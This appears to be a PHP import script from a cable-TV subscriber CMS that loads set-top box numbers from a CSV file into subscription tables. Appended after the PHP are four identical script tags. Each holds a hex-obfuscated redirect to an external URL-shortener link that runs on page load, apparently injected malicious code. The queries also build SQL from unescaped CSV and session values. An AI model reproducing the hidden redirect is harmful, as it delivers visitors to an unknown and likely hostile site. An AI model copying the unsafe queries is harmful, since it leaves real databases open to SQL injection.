<?php
require_once("helper.php");
$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
//if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    //if(!empty($_POST['attachment'])){
        $fileName="uploads/walia-cable-correction-boxes.csv";
        if (!$fp = fopen($fileName,"r")){
            echo "Sorry, cannot open the file";
        }else{       
            while(!feof($fp)) {
                while (($data = fgetcsv($fp, 10000, ",")) !== FALSE) { 
                    //print_r($data); exit;
                     $fileRow++;    
                    $num = count($data);
                     if ($fileRow <= "1") continue;      // Continue Back Bcz//Code For Setup Boxes
                    echo $subscriptionId=$objMisc->GiveValue("STB_NO='$data[7]' AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUBSCRIPTION_ID','subscriptions');
                    if(empty($subscriptionId)){
                        $rowArray=array('STB_NO'        =>$data[7],
                                        'AVAILABILITY'  =>'B',
                                        'HEADOFFICE_ID' =>$_SESSION['HEADOFFICE']);
                        //print_r($rowArray);
                        $insert=$objMisc->insert('subscriptions',$rowArray);
                        $lastId=mysqli_insert_id($_SESSION['CONN']);
                        $updateArray=array('SUBSCRIPTION_ID'    =>$lastId);
                        //echo "SUBSCRIBER_ID='$data[0]' AND SUSCRIPTION_ID='$data[1]'".'<br>';
                        $update=$objMisc->update('stb_box',$updateArray,"SUBSCRIBER_ID='$data[0]' AND SUBSCRIPTION_ID='$data[1]'");
                    }else{
                        $updateArray=array('SUBSCRIPTION_ID'    =>$subscriptionId);
                        //print_r($updateArray);
                        $update=$objMisc->update('stb_box',$updateArray,"SUBSCRIBER_ID='$data[0]' AND SUBSCRIPTION_ID='$data[1]'");
                    }
                    
                }
            }
            echo 'success';
            /*$_SESSION['msg']=1;
            header("LOCATION:import-stb-otherway.php");
            exit;*/
        } 
    //}else{
        //$_SESSION['msg']=2;
          //  header("LOCATION:import-stb-otherway.php");
        //    exit;
    //}
//} 
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>